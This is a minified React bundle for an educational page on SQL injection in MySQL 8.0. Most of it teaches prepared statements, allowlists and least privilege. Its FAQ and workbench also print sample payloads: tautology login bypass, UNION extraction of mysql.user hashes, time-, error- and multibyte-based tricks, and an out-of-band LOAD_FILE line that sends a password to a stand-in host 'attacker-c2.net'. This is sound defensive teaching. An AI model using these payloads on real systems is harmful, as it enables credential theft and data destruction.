import{b as c,j as e,bg as i}from"./vendor-react-core-Doz9nIC6.js";import{T as d}from"./TeacherSukantaHui-ObIX4NbR.js";import{F as m}from"./FAQTemplate-CkSqDH4B.js";import{P as u}from"./PlainTextPrint-C08xhKA4.js";import"./vendor-icons-CbUXUJ65.js";const p=[{question:"What is SQL Injection (SQLi), and what is its root architectural cause?",shortAnswer:"SQLi occurs when untrusted user input is directly concatenated into a dynamic SQL string, allowing user data to be interpreted by the database parser as executable SQL commands.",explanation:"The root cause of SQL injection is the failure to separate data from code. When an application builds SQL statements by joining strings with user input, an attacker can supply SQL keywords, quotes, or comment characters to rewrite the query execution structure.",hint:"Think about user data being mistakenly executed as SQL commands due to string concatenation.",level:"basic",codeExample:`// Vulnerable Code:
const query = "SELECT * FROM users WHERE user = '" + req.body.username + "'";
// If user sends: admin' OR '1'='1
// Query becomes: SELECT * FROM users WHERE user = 'admin' OR '1'='1'`},{question:"How do Parameterized Queries (Prepared Statements) mathematically neutralize SQL Injection?",shortAnswer:"By separating query compilation from data binding: the SQL query structure is parsed and compiled first, and parameters are sent separately as pure literal values that can never be executed as code.",explanation:"In a prepared statement, MySQL compiles the query parse tree before receiving the parameter values. When parameters are subsequently supplied, the database treats them strictly as literal data strings or integers, completely ignoring any quotes, SQL syntax, or SQL keywords within them.",hint:"The query parser compiles the statement before parameter values are ever evaluated.",level:"basic",codeExample:`-- MySQL Prepared Statement:
PREPARE stmt FROM 'SELECT * FROM users WHERE user = ? AND pass = ?';
SET @u = "admin' OR '1'='1", @p = 'password';
EXECUTE stmt USING @u, @p;
-- Evaluates literally looking for a username equal to the string "admin' OR '1'='1"`},{question:"What is a 'Tautology' or Authentication Bypass attack in SQL Injection?",shortAnswer:"An injection payload (such as `' OR '1'='1' -- `) that alters the WHERE clause logic so that it always evaluates to TRUE, bypassing password verification.",explanation:"In a query like `SELECT * FROM users WHERE username = 'USER' AND password = 'PASS'`, injecting `' OR '1'='1' -- ` causes the condition to evaluate as `TRUE`, returning the first row in the table (typically the administrator) regardless of the password.",hint:"Payloads that force boolean expressions to evaluate to TRUE unconditionally.",level:"basic",codeExample:"SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...'"},{question:"What is a UNION-Based SQL Injection attack?",shortAnswer:"An attack where the attacker appends a `UNION SELECT` statement to the original query to exfiltrate data from other tables into the application response.",explanation:"If an application displays search results from `SELECT item_name, price FROM products WHERE category = 'X'`, injecting `' UNION SELECT username, password_hash FROM admin_users -- ` merges administrative credentials into the returned product list.",hint:"Appends UNION SELECT to merge results from sensitive tables.",level:"intermediate",codeExample:`SELECT item_name, price FROM products 
WHERE category = 'electronics' UNION SELECT user, authentication_string FROM mysql.user -- '`},{question:"What is Blind SQL Injection, and what are its two primary variants?",shortAnswer:"An injection where the application does not return query results or errors on screen; partitioned into Boolean-Based Blind and Time-Based Blind.",explanation:"In blind SQL injection, the attacker cannot see data directly. In Boolean-based blind, they observe TRUE/FALSE application behavior changes. In Time-based blind, they use database sleep functions (e.g. `IF(condition, SLEEP(5), 0)`) to infer characters byte-by-byte based on server response latency.",hint:"Inferring data via True/False differences or server response delays.",level:"intermediate",codeExample:`-- Time-based blind payload in MySQL:
SELECT * FROM orders WHERE order_id = 10 AND IF(SUBSTRING(version(),1,1)='8', SLEEP(5), 0);`},{question:"What is Second-Order SQL Injection?",shortAnswer:"An attack where the malicious payload is safely stored in the database during an initial operation, but executed as dynamic SQL when read and concatenated by a subsequent query later.",explanation:"For example, a user registers with a username containing an injection payload (e.g. `admin'--`). The registration uses prepared statements so no injection occurs initially. Later, an automated nightly billing script concatenates the stored username into raw dynamic SQL, triggering the payload.",hint:"Payload is stored harmlessly first, then executed dynamically in a secondary query.",level:"expert",codeExample:`// Registration: Safely stored in DB via prepared statement
// Admin script later: "UPDATE accounts SET balance = 0 WHERE username = '" + row.username + "'" -> EXPLODES!`},{question:"Why is manual string escaping (such as `addslashes()` or legacy escaping functions) fundamentally unsafe compared to true parameterized queries?",shortAnswer:"Because character encoding mismatches (such as GBK or Big5 multibyte encodings) can allow attackers to inject bytes that consume the backslash escape character, resurrecting the malicious quote.",explanation:"In multibyte encodings, injecting `%bf%27` causes `addslashes` to insert a backslash `%5c`, forming `%bf%5c%27`. The database interprets `%bf%5c` as a single valid multibyte character, leaving the single quote `%27` unescaped and active. Prepared statements do not rely on character escaping.",hint:"Multibyte character encoding tricks can consume escape characters.",level:"expert",codeExample:`// Multibyte encoding bypass:
// Input: %bf%27 -> Escaped: %bf%5c%27 -> Parsed by DB as: [Character]%27 (Active Quote!)`},{question:"Can table names and column names be parameterized with `?` placeholders in prepared statements?",shortAnswer:"No, SQL syntax requires table and column names to be known at query compilation time; only literal values can be bound to `?` placeholders.",explanation:"Executing `PREPARE stmt FROM 'SELECT * FROM ?';` throws a syntax error in MySQL. If an application requires dynamic table or column selection, it must use strict programmatic allowlists.",hint:"Placeholders can only represent literal data values, never table or column identifiers.",level:"intermediate",codeExample:`-- Prohibited (Throws Syntax Error):
-- PREPARE stmt FROM 'SELECT * FROM ? WHERE id = ?';`},{question:"How should an application safely implement dynamic sorting (`ORDER BY`) or dynamic column selection without introducing SQL injection?",shortAnswer:"By validating user input against a hardcoded programmatic allowlist (e.g. switch/case or array lookup) before building the query.",explanation:"Instead of concatenating raw `req.query.sort` directly into the `ORDER BY` clause, the code checks if the input is in `['price', 'created_at', 'item_name']`. If not present, it defaults to a safe fallback column.",hint:"Use strict allowlist mapping for dynamic SQL identifiers.",level:"intermediate",codeExample:"// Safe dynamic sorting in Node.js:\nconst ALLOWED_COLUMNS = { 'price': 'price', 'date': 'created_at', 'name': 'item_name' };\nconst sortColumn = ALLOWED_COLUMNS[req.query.sort] || 'created_at';\nconst sql = `SELECT * FROM products ORDER BY ${sortColumn} ASC`;"},{question:"In Mamata & Susmita's Barrackpore store, a legacy PHP script concatenated customer search inputs into `SELECT * FROM products WHERE name LIKE '%$search%'`. How was this modernized securely?",shortAnswer:"They converted the query to a prepared statement and bound the wildcard string to the parameter placeholder: `WHERE name LIKE ?` with `[%${search}%]`.",explanation:"Concatenating the `%` wildcard inside the parameter value rather than in the SQL string ensures the input is treated strictly as literal search text, neutralizing injection characters.",hint:"Pass the wildcard characters inside the parameter value rather than the SQL string.",level:"moderate",codeExample:`// Secure LIKE search with Prepared Statements:
const searchTerm = '%' + req.query.search + '%';
const [rows] = await db.execute(
  'SELECT product_id, item_name, price FROM products WHERE item_name LIKE ?',
  [searchTerm]
);`},{question:"In Abhronila & Debangshu's Kolkata fintech bank, an automated payment processor handled ₹50 Crores in daily transactions. How did they enforce zero-trust query security?",shortAnswer:"They combined JDBC Prepared Statements across all Java microservices with DB-level `SQL SECURITY DEFINER` stored procedures, completely eliminating raw dynamic SQL.",explanation:"Even if an attacker bypassed application-level parameterization, the database user account had 0 direct table privileges and could only invoke parameterized stored procedures.",hint:"Combine parameterized queries with stored procedure encapsulation and least privilege.",level:"expert",codeExample:`// Java JDBC PreparedStatement:
String sql = "{CALL sp_process_transfer(?, ?, ?)}";
CallableStatement stmt = conn.prepareCall(sql);
stmt.setInt(1, fromAccount);
stmt.setInt(2, toAccount);
stmt.setBigDecimal(3, transferAmount);
stmt.execute();`},{question:"What is Error-Based SQL Injection?",shortAnswer:"An attack technique where an attacker deliberately crafts payloads that trigger detailed database error messages containing confidential schema data or query results.",explanation:"In MySQL, functions like `EXTRACTVALUE()` or `UpdateXML()` can be manipulated to evaluate subqueries inside XPath errors (e.g. `XPATH syntax error: '~8.0.36~'`), leaking database contents directly into error messages.",hint:"Forcing database engines to output sensitive data inside syntax error messages.",level:"expert",codeExample:"SELECT * FROM products WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e));"},{question:"How does disabling detailed database error messages in production protect against SQL injection reconnaissance?",shortAnswer:"It prevents attackers from seeing table names, column names, database versions, and SQL fragments in HTTP responses, forcing them into slower blind techniques.",explanation:"Production web applications should always catch database exceptions and return generic error pages (e.g. 'Internal Server Error') while logging the stack trace securely to private backend log aggregators.",hint:"Hide database error details from public responses to prevent reconnaissance.",level:"basic",codeExample:`// Generic error response in production:
try {
  await db.execute(sql, params);
} catch (err) {
  logger.error(err); // Private log
  res.status(500).json({ error: "An unexpected error occurred." }); // Generic public response
}`},{question:"What role does an Object-Relational Mapper (ORM) like Prisma, TypeORM, or Hibernate play in SQL injection defense?",shortAnswer:"ORMs automatically generate parameterized queries under the hood for standard CRUD operations, abstracting developers from raw string concatenation.",explanation:"When using `prisma.user.findMany({ where: { email: input } })`, the ORM uses prepared statements natively. However, using raw query methods (like `prisma.$queryRawUnsafe`) with string concatenation reintroduces SQL injection vulnerabilities.",hint:"ORMs use prepared statements by default, but raw query methods can still be vulnerable.",level:"intermediate",codeExample:`// Safe ORM usage:
await prisma.user.findUnique({ where: { email: userInput } });

// DANGEROUS anti-pattern in ORM:
// await prisma.$queryRawUnsafe(\`SELECT * FROM User WHERE email = '\${userInput}'\`);`},{question:"What is the function of a Web Application Firewall (WAF) in SQL injection defense?",shortAnswer:"A WAF acts as an edge perimeter filter inspecting HTTP payloads for known SQL injection patterns and blocking malicious requests before they reach the application server.",explanation:"While WAFs (like AWS WAF, Cloudflare, ModSecurity) provide valuable defense-in-depth against automated scanning bots, they are not a replacement for parameterized queries because advanced encoding techniques can sometimes bypass WAF regex signatures.",hint:"WAF provides edge perimeter filtering, but parameterized queries remain mandatory.",level:"intermediate",codeExample:"-- WAF blocks requests containing signatures like 'UNION SELECT' or 'OR 1=1'"},{question:"How does the MySQL system variable `sql_mode = 'NO_BACKSLASH_ESCAPES'` impact SQL injection vectors?",shortAnswer:"It disables the use of the backslash character (`\\`) as an escape character, treating backslashes as ordinary string literals.",explanation:"When enabled, strings can only be escaped by doubling the quotes (`''`), preventing certain backslash-stripping evasion techniques.",hint:"Treats backslashes as literal characters rather than escape markers.",level:"expert",codeExample:"SET GLOBAL sql_mode = 'NO_BACKSLASH_ESCAPES,STRICT_TRANS_TABLES';"},{question:"How do you execute a Prepared Statement in Python using `mysql-connector-python`?",shortAnswer:"Use `cursor.execute(sql, (param1, param2))` passing parameters as a tuple.",explanation:"The driver automatically maps placeholders (`%s`) to parameterized query variables.",hint:"Pass parameters as a tuple in cursor.execute.",level:"basic",codeExample:`query = "SELECT user_id, email FROM users WHERE username = %s AND status = %s"
cursor.execute(query, (user_input, "ACTIVE"))
results = cursor.fetchall()`},{question:"What is the difference between client-side parameter emulation and true server-side prepared statements in database drivers?",shortAnswer:"Client-side emulation escapes parameters in application memory and sends a single concatenated string to MySQL; server-side prepared statements use the binary protocol to transmit SQL templates and parameters in separate network packets.",explanation:"In Node.js `mysql2`, `connection.query()` emulates prepared statements, whereas `connection.execute()` uses true server-side binary protocol prepared statements, delivering optimal security and performance.",hint:"True prepared statements use the binary protocol to separate SQL templates from data packets.",level:"expert",codeExample:`// True server-side prepared statement in mysql2:
const [rows] = await connection.execute('SELECT * FROM accounts WHERE id = ?', [accId]);`},{question:"How does strict input type validation (e.g. `parseInt()` or schema validators like Zod) supplement prepared statements?",shortAnswer:"It rejects malformed data at the application boundary before it ever reaches the database layer, enforcing strong data integrity.",explanation:"Validating that an `order_id` is strictly a positive integer ensures that non-numeric strings are rejected immediately, reducing database load and eliminating edge-case parsing bugs.",hint:"Rejects invalid inputs at the API controller tier before database queries execute.",level:"basic",codeExample:`// Input validation with Zod in Node.js:
const OrderIdSchema = z.number().int().positive();
const safeOrderId = OrderIdSchema.parse(Number(req.params.id));`},{question:"What is a 'Stacked Queries' attack, and is it supported by default in MySQL client libraries?",shortAnswer:"An attack where an attacker injects a semicolon (`;`) followed by a second distinct SQL command (e.g. `1; DROP TABLE users;`); disabled by default in most MySQL client drivers.",explanation:"In PHP `mysqli` and Node.js `mysql2`, multi-statement query execution is disabled by default to prevent stacked query execution. However, if `multipleStatements: true` is enabled in connection options, stacked queries become possible.",hint:"Executing multiple SQL commands separated by semicolons in a single request.",level:"intermediate",codeExample:`// Keep multipleStatements disabled in driver settings:
const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user',
  multipleStatements: false // Mandatory security baseline!
});`},{question:"How can SQL Injection lead to Remote Code Execution (RCE) on the database host server if privileges are misconfigured?",shortAnswer:"If the database user possesses the `FILE` privilege and `secure_file_priv` is empty, an attacker can use `SELECT ... INTO OUTFILE` to write unauthorized files into filesystem directories.",explanation:"By injecting `SELECT 'unauthorized_data' INTO OUTFILE '/var/www/html/unauthorized_export.txt'`, an attacker attempts arbitrary file creation. This is why least privilege must revoke `FILE` privilege from application users.",hint:"Writing unauthorized files via INTO OUTFILE when FILE privilege is enabled.",level:"expert",codeExample:"-- Prohibited in secure deployments by setting secure_file_priv = NULL in my.cnf"},{question:"What is the difference between `mysql_real_escape_string()` and `caching_sha2_password`?",shortAnswer:"`mysql_real_escape_string()` is an obsolete client-side string sanitization function; `caching_sha2_password` is a server-side authentication plugin for validating user credentials.",explanation:"Escaping functions handle SQL query string formation, whereas authentication plugins handle network handshakes and password verification.",hint:"Differentiate between query sanitization functions and connection authentication plugins.",level:"basic",codeExample:`-- Authentication Plugin: caching_sha2_password
-- Query Sanitization: Prepared Statements (connection.execute)`},{question:"How do you deallocate a prepared statement in MySQL SQL session when it is no longer needed?",shortAnswer:"`DEALLOCATE PREPARE statement_name;` (or `DROP PREPARE statement_name;`).",explanation:"Deallocating prepared statements frees server-side memory allocations associated with compiled execution plans in that connection session.",hint:"Use DEALLOCATE PREPARE stmt_name.",level:"intermediate",codeExample:"DEALLOCATE PREPARE stmt_find_user;"},{question:"What happens if a user submits SQL code as an input to a prepared statement parameter (e.g. `' DROP TABLE accounts; --`)?",shortAnswer:'The entire string is treated literally as text data, resulting in a query searching for rows where the column exactly equals the string `"\' DROP TABLE accounts; --"`.',explanation:"Because the statement is already compiled, the database engine does not invoke the SQL parser on parameter values. The literal text is safely compared against column data with zero execution risk.",hint:"The database treats the entire input string as a literal value.",level:"basic",codeExample:`-- Stored/Searched literally as the text value:
-- "' DROP TABLE accounts; --"`},{question:"What is an Out-of-Band (OOB) SQL Injection attack?",shortAnswer:"An attack technique where the database server is forced to initiate an external network connection (such as DNS or HTTP requests) to transmit data to an attacker-controlled server.",explanation:"Used when both in-band responses and blind time-based techniques are disabled. In MySQL, functions like `LOAD_FILE(CONCAT('\\\\\\\\', data, '.attacker-c2.net\\\\a'))` trigger Windows SMB DNS resolution queries.",hint:"Forcing database servers to make external DNS/HTTP requests to leak data.",level:"expert",codeExample:`-- Out-of-band DNS exfiltration via SMB UNC path:
-- SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker-c2.net\\\\test'));`},{question:"Why does using `IN (?)` with an array of values require special handling in prepared statements?",shortAnswer:"Because a single `?` placeholder represents exactly ONE literal value, not a comma-separated list of values.",explanation:"If you bind `[1, 2, 3]` to a single `?`, MySQL interprets it as a single string `'1,2,3'`. To query multiple values, the application must generate one `?` placeholder for each array element: `WHERE id IN (?, ?, ?)`. Drivers like `mysql2` support expanded syntax `IN (?)` automatically.",hint:"Each placeholder matches exactly one value; arrays need multiple placeholders.",level:"intermediate",codeExample:`// Expanding placeholders for arrays:
const ids = [10, 20, 30];
const placeholders = ids.map(() => '?').join(',');
const sql = \`SELECT * FROM orders WHERE order_id IN (\${placeholders})\`;
const [rows] = await connection.execute(sql, ids);`},{question:"How do Static Application Security Testing (SAST) tools detect SQL injection vulnerabilities in source code?",shortAnswer:"By performing data flow and taint analysis, tracing untrusted user input from HTTP sources (e.g. `req.body`) to SQL sinks (e.g. `db.query()`) without parameterized sanitization.",explanation:"SAST tools (like SonarQube, Semgrep, CodeQL) flag any direct string concatenation feeding into database execution methods.",hint:"Taint analysis tracks untrusted input flow into raw SQL sinks.",level:"intermediate",codeExample:"// SAST flags this taint flow:\n// Source: req.body.email -> Sink: db.query(`... ${req.body.email}`)"},{question:"Can SQL Injection occur in stored procedures?",shortAnswer:"Yes, if a stored procedure dynamically constructs SQL strings using `CONCAT()` and executes them via `PREPARE` and `EXECUTE` without parameterization.",explanation:"Stored procedures are not automatically immune to SQL injection if developers write dynamic SQL inside them using raw string concatenation.",hint:"Dynamic SQL inside stored procedures is vulnerable if constructed with string concatenation.",level:"expert",codeExample:`-- Vulnerable Stored Procedure:
-- SET @sql = CONCAT('SELECT * FROM users WHERE name = '', p_input, ''');
-- PREPARE stmt FROM @sql; EXECUTE stmt;`},{question:"What is the primary operational takeaway of Topic 10 in Module 004_003?",shortAnswer:"Parameterized queries (prepared statements) are the non-negotiable primary defense against SQL injection: they mathematically separate code from data. Combine them with the Principle of Least Privilege and strict allowlists for dynamic identifiers.",explanation:"SQL injection remains one of the most critical web vulnerabilities. By mandating prepared statements across all application drivers, avoiding raw string concatenation, and restricting database service account privileges, organizations achieve 100% immunity against SQL injection attacks.",hint:"Summarize prepared statements, mathematical separation of code and data, and least privilege.",level:"basic",codeExample:`-- Production Golden Standard:
const [rows] = await connection.execute(
  'SELECT order_id, total_amount, status FROM orders WHERE customer_id = ? AND store_city = ?',
  [safeCustomerId, safeCity]
);`}],h=`================================================================================
MYSQL 8.0 DATABASE SECURITY & PRIVILEGE MANAGEMENT
TOPIC 10: SQL Injection (SQLi) – Attack Vectors & Parameterized Defense
================================================================================

1. WHAT IS SQL INJECTION (SQLi)?
--------------------------------------------------------------------------------
SQL Injection occurs when untrusted user input is directly concatenated into a
dynamic SQL query string instead of being separated into literal parameters.
This allows attackers to manipulate query logic, bypass authentication, exfiltrate
sensitive data, mutate database state, or execute administrative commands.

2. COMMON SQL INJECTION ATTACK VECTORS
--------------------------------------------------------------------------------
A. Authentication Bypass (Tautology Attack):
   - Dynamic Vulnerable Code:
     query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";
   - Attacker Payload in username:
     admin' OR '1'='1' -- 
   - Evaluated SQL:
     SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '...';
   - Result: '1'='1' is always TRUE; the trailing query is commented out; login succeeds!

B. UNION-Based Data Exfiltration:
   - Attacker injects a UNION SELECT query to siphon data from another table:
     1 UNION SELECT 1, user, authentication_string, 4 FROM mysql.user -- 

C. Blind SQL Injection (Boolean & Time-Based):
   - Boolean-based: Observing differences in application response between TRUE/FALSE conditions.
   - Time-based: Forcing database latency using \`SLEEP(5)\` or \`BENCHMARK()\` to infer data byte-by-byte.

D. Second-Order SQL Injection:
   - Malicious payload is stored in the database safely, but executed later when
     an internal administrative script concatenates the stored value into a second query.

3. THE PRIMARY DEFENSE: PARAMETERIZED QUERIES (PREPARED STATEMENTS)
--------------------------------------------------------------------------------
Why Prepared Statements 100% Neutralize SQL Injection:
- 2-Stage Query Lifecycle:
  Stage 1 (Prepare): The SQL template is sent to MySQL Server. The query parser
  compiles the syntax and generates the execution plan.
  Stage 2 (Execute): User parameters are transmitted separately as pure data values.
- Mathematical Separation of Code and Data:
  Because the query structure is already compiled, user inputs can NEVER be
  interpreted as SQL syntax, keywords (\`OR\`, \`UNION\`, \`DROP\`), or comment markers (\`--\`).

4. IMPLEMENTATION ACROSS PROGRAMMING LANGUAGES
--------------------------------------------------------------------------------
A. Native MySQL Prepared Statements (SQL Layer):
   PREPARE stmt_find_user FROM 'SELECT user_id, email FROM users WHERE username = ? AND status = ?';
   SET @user = 'mamata', @status = 'ACTIVE';
   EXECUTE stmt_find_user USING @user, @status;
   DEALLOCATE PREPARE stmt_find_user;

B. Node.js (mysql2 with Prepared Statements):
   const [rows] = await connection.execute(
     'SELECT user_id, email, balance FROM accounts WHERE customer_id = ? AND city = ?',
     [customerId, city]
   );

C. Java (JDBC PreparedStatement):
   String sql = "SELECT account_id, balance FROM accounts WHERE account_num = ?";
   PreparedStatement stmt = conn.prepareStatement(sql);
   stmt.setString(1, accountNum);
   ResultSet rs = stmt.executeQuery();

D. Python (PyMySQL / mysql-connector-python):
   cursor.execute(
     "SELECT user_id, full_name FROM customers WHERE phone = %s",
     (phone_input,)
   );

5. DEFENSE-IN-DEPTH: SECONDARY COUNTERMEASURES
--------------------------------------------------------------------------------
1. Principle of Least Privilege: Application database accounts must have 0 DDL permissions.
2. Input Validation & Strict Typing: Cast integer IDs (\`parseInt()\`) before query execution.
3. Allowlisting for Dynamic Table/Column Names:
   - Prepared statements cannot parameterize table names (\`FROM ?\`) or column names.
   - Use strict switch-case allowlists for dynamic sorting or table selection.
4. Web Application Firewall (WAF) & ModSecurity: Provides edge perimeter filtering.
================================================================================
`,S=()=>{const[r,o]=c.useState("phase1_attack_vectors"),s={phase1_attack_vectors:{phaseNumber:"Phase 1: Attack Vectors & Payloads",title:"1. The Anatomy of SQL Injection Attacks",badge:"Vulnerability Mechanics",badgeColor:"rose",sqlSnippet:`-- ⚠️ VULNERABLE DYNAMIC STRING CONCATENATION:
-- Query: "SELECT * FROM users WHERE user = '" + inputUser + "' AND pass = '" + inputPass + "'"

-- 1. Tautology Authentication Bypass Payload:
-- Input in username: admin' OR '1'='1' -- 
-- Evaluated SQL:
SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- ' AND pass = '...';

-- 2. UNION-Based Data Exfiltration:
-- Input in search: ' UNION SELECT 1, user, authentication_string, 4 FROM mysql.user -- 
-- Evaluated SQL:
SELECT item_id, item_name, price FROM products 
WHERE item_name = '' UNION SELECT 1, user, authentication_string, 4 FROM mysql.user -- ';`,explanation:"When an application constructs SQL statements by concatenating raw user input strings, the database SQL parser interprets user data as executable SQL commands, enabling attackers to bypass logins, steal password hashes, or delete records.",keyTakeaways:["Tautologies force WHERE clauses to evaluate to TRUE unconditionally.","UNION injections merge confidential tables into public application responses.","Root cause is the failure to mathematically separate code from data."]},phase2_prepared_statements:{phaseNumber:"Phase 2: Prepared Statements Defense",title:"2. The 2-Stage Prepared Statement Compilation Lifecycle",badge:"Mathematical Defense",badgeColor:"emerald",sqlSnippet:`-- 🛡️ NATIVE MYSQL PREPARED STATEMENTS (SQL LAYER):

-- STAGE 1: COMPILE & PREPARE EXECUTION PLAN:
-- The SQL parser compiles syntax tree BEFORE user values are seen!
PREPARE stmt_auth FROM 
  'SELECT user_id, email, role FROM users WHERE username = ? AND password_hash = ?';

-- STAGE 2: EXECUTE WITH LITERAL DATA PARAMETERS:
-- Malicious input is treated strictly as literal string characters:
SET @malicious_user = "admin' OR '1'='1' -- ";
SET @password_hash = "Hash#2026";

EXECUTE stmt_auth USING @malicious_user, @password_hash;
-- Result: Searches for an account literally named "admin' OR '1'='1' -- ". Zero injection!

DEALLOCATE PREPARE stmt_auth;`,explanation:"Prepared statements eliminate SQL injection by compiling the SQL parse tree before parameter values are received. User inputs are transmitted as pure literal data values over the binary protocol, making it mathematically impossible for input strings to alter query syntax.",keyTakeaways:["Stage 1 (Prepare): Compiles SQL syntax and locks the execution plan.","Stage 2 (Execute): Binds parameter values as literal data bytes.","User quotes and comment symbols are treated strictly as harmless text."]},phase3_language_drivers:{phaseNumber:"Phase 3: Multi-Language Implementation",title:"3. Parameterization Across Modern Application Stacks",badge:"Production Code",badgeColor:"cyan",sqlSnippet:`// 🌐 1. Node.js (mysql2 Binary Protocol Prepared Statements):
const [rows] = await connection.execute(
  'SELECT account_id, balance FROM accounts WHERE customer_id = ? AND city = ?',
  [customerId, 'Kolkata']
);

// ☕ 2. Java (JDBC PreparedStatement):
String sql = "SELECT balance FROM accounts WHERE account_num = ? AND status = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, accountNum);
stmt.setString(2, "ACTIVE");
ResultSet rs = stmt.executeQuery();

# 🐍 3. Python (mysql-connector-python):
query = "SELECT user_id, email FROM users WHERE phone = %s"
cursor.execute(query, (user_phone,))`,explanation:"Modern language drivers provide native support for binary protocol prepared statements. Using connection.execute() in Node.js, PreparedStatement in Java, and parameterized cursor.execute() in Python guarantees 100% protection across the entire engineering fleet.",keyTakeaways:["Node.js mysql2: Always use connection.execute() instead of connection.query().","Java JDBC: PreparedStatement handles data type escaping natively.","Python: Pass parameters as tuples in cursor.execute()."]},phase4_dynamic_identifiers:{phaseNumber:"Phase 4: Dynamic Identifiers & Allowlists",title:"4. Securing Dynamic ORDER BY & Table Names via Allowlists",badge:"Identifier Allowlists",badgeColor:"purple",sqlSnippet:`// 🔒 SECURE DYNAMIC SORTING VIA PROGRAMMATIC ALLOWLISTING:

// Dynamic column names CANNOT use '?' placeholders!
// Vulnerable Anti-Pattern: \`ORDER BY \${req.query.sortBy}\` -> SQLi!

// Production Best Practice (Strict Dictionary Allowlist):
const ALLOWED_SORT_COLUMNS = {
  'price': 'unit_price',
  'date': 'created_at',
  'name': 'product_name'
};

// Safe lookup with deterministic fallback:
const targetColumn = ALLOWED_SORT_COLUMNS[req.query.sortBy] || 'created_at';
const sortOrder = req.query.order === 'DESC' ? 'DESC' : 'ASC';

// Safe to concatenate strictly validated internal tokens:
const sql = \`SELECT product_id, product_name, unit_price FROM products ORDER BY \${targetColumn} \${sortOrder}\`;
const [results] = await db.execute(sql);`,explanation:"Because SQL placeholders (?) only accept literal values and cannot parameterize table or column identifiers, dynamic sorting or schema selection must be validated against hardcoded programmatic allowlists before query execution.",keyTakeaways:["SQL placeholders (?) cannot be used for table or column names.","Validate sorting parameters against strict hardcoded dictionary maps.","Always provide safe default fallbacks for unapproved input values."]}},t=s[r];return e.jsxs("div",{className:"bg-slate-950 text-slate-100 min-h-screen py-10 px-4 sm:px-6 lg:px-8 font-sans",children:[e.jsxs("header",{className:"max-w-6xl mx-auto mb-10 text-center sm:text-left border-b border-slate-800 pb-8",children:[e.jsxs("div",{className:"flex flex-wrap items-center gap-3 mb-3",children:[e.jsx("span",{className:"px-3 py-1 bg-emerald-950/80 text-emerald-400 border border-emerald-800 rounded-full text-xs font-mono font-semibold uppercase tracking-wider",children:"Module 004.3: User Security & Privilege Management"}),e.jsx("span",{className:"px-3 py-1 bg-cyan-950/80 text-cyan-400 border border-cyan-800 rounded-full text-xs font-mono font-semibold uppercase tracking-wider",children:"Topic 10 of 13"})]}),e.jsxs("h1",{className:"text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight",children:["SQL Injection (SQLi) Defense: ",e.jsx("span",{className:"text-emerald-400",children:"Prepared Statements"})," & Attack Vectors"]}),e.jsx("p",{className:"mt-4 text-base sm:text-lg text-slate-400 max-w-4xl leading-relaxed",children:"Mastering the definitive defense against SQL injection: analyzing attack vectors (Tautology authentication bypass, UNION exfiltration, Blind SQLi), implementing the 2-stage prepared statement compilation lifecycle, and securing dynamic identifiers with allowlists in MySQL 8.0."})]}),e.jsxs("main",{className:"max-w-6xl mx-auto space-y-16",children:[e.jsxs("section",{id:"defense-matrix",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-emerald-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"1. Attack Vectors vs Parameterized Defenses"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"How prepared statements mathematically neutralize each major SQL injection vector."})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6",children:[e.jsxs("div",{className:"p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-2",children:[e.jsx("span",{className:"text-xs font-mono text-rose-400 font-bold uppercase",children:"Attack 1"}),e.jsx("h3",{className:"font-bold text-white text-base",children:"Tautology Auth Bypass"}),e.jsxs("p",{className:"text-xs text-slate-300 leading-relaxed",children:["Injects ",e.jsx("code",{children:"' OR '1'='1"})," to force boolean TRUE. Neutralized by binding password as a literal string."]})]}),e.jsxs("div",{className:"p-5 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-2",children:[e.jsx("span",{className:"text-xs font-mono text-amber-400 font-bold uppercase",children:"Attack 2"}),e.jsx("h3",{className:"font-bold text-white text-base",children:"UNION Exfiltration"}),e.jsxs("p",{className:"text-xs text-slate-300 leading-relaxed",children:["Appends ",e.jsx("code",{children:"UNION SELECT"})," to steal data. Neutralized because the compiled query grammar cannot accept new clauses."]})]}),e.jsxs("div",{className:"p-5 rounded-2xl bg-slate-900/90 border border-purple-700/60 bg-purple-950/20 space-y-2 shadow-lg shadow-purple-950/40",children:[e.jsx("span",{className:"text-xs font-mono text-purple-400 font-bold uppercase",children:"Attack 3"}),e.jsx("h3",{className:"font-bold text-purple-300 text-base",children:"Time-Based Blind"}),e.jsxs("p",{className:"text-xs text-slate-200 leading-relaxed",children:["Injects ",e.jsx("code",{children:"SLEEP(5)"})," to infer bits. Neutralized because function calls inside parameters are treated as literal text."]})]}),e.jsxs("div",{className:"p-5 rounded-2xl bg-slate-900/90 border border-emerald-700/60 bg-emerald-950/20 space-y-2",children:[e.jsx("span",{className:"text-xs font-mono text-emerald-400 font-bold uppercase",children:"Defense"}),e.jsx("h3",{className:"font-bold text-emerald-300 text-base",children:"Prepared Statements"}),e.jsx("p",{className:"text-xs text-slate-200 leading-relaxed",children:"Compiles the SQL parse tree first, transmitting data parameters in separate binary protocol packets."})]})]})]}),e.jsxs("section",{id:"interactive-workbench",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-cyan-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"2. Interactive SQLi Defense Workbench"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"Test and observe SQL injection attack vectors, prepared statements compilation, and language implementations."})]}),e.jsx("div",{className:"flex flex-wrap gap-3",children:Object.keys(s).map(a=>{const n=s[a],l=r===a;return e.jsx("button",{onClick:()=>o(a),className:i("px-4 py-2.5 rounded-xl font-medium text-xs sm:text-sm transition-all duration-200 border",l?"bg-emerald-500/10 